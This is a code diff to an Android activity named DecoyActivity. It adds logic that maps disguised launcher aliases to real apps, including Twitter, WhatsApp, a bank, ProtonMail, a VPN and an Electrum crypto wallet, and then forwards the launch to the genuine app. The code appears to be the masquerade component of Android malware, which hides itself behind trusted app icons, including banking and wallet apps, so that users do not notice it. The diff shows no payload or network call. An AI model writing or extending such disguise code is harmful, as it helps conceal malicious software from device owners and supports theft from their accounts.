@@ -73,6 +73,24 @@ public class DecoyActivity extends AppCompatActivity {
 
         // --- MASQUERADE PASSTHROUGH ---
         String masqPkg = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getString("masquerade_pkg", "");
+        
+        // Auto-infer package from launch component if not explicitly stored
+        if (masqPkg.isEmpty()) {
+            if (componentName.contains("TwitterAlias")) masqPkg = "com.twitter.android";
+            else if (componentName.contains("WhatsAppAlias")) masqPkg = "com.whatsapp";
+            else if (componentName.contains("TelegramAlias")) masqPkg = "org.telegram.messenger";
+            else if (componentName.contains("InstagramAlias")) masqPkg = "com.instagram.android";
+            else if (componentName.contains("YouTubeAlias")) masqPkg = "com.google.android.youtube";
+            else if (componentName.contains("ChromeAlias")) masqPkg = "com.android.chrome";
+            else if (componentName.contains("BankAlias")) masqPkg = "ca.pcfinancial.bank";
+            else if (componentName.contains("MailAlias")) masqPkg = "ch.protonmail.android";
+            else if (componentName.contains("VPNAlias")) masqPkg = "ch.protonvpn.android";
+            else if (componentName.contains("PdfAlias")) masqPkg = "com.adobe.reader";
+            else if (componentName.contains("MusicAlias")) masqPkg = "com.sec.android.app.music";
+            else if (componentName.contains("TermuxAlias")) masqPkg = "com.termux";
+            else if (componentName.contains("CryptoAlias")) masqPkg = "org.electrum.electrum";
+        }
+
         if (!masqPkg.isEmpty()) {
             try {
                 Intent launchIntent = getPackageManager().getLaunchIntentForPackage(masqPkg);
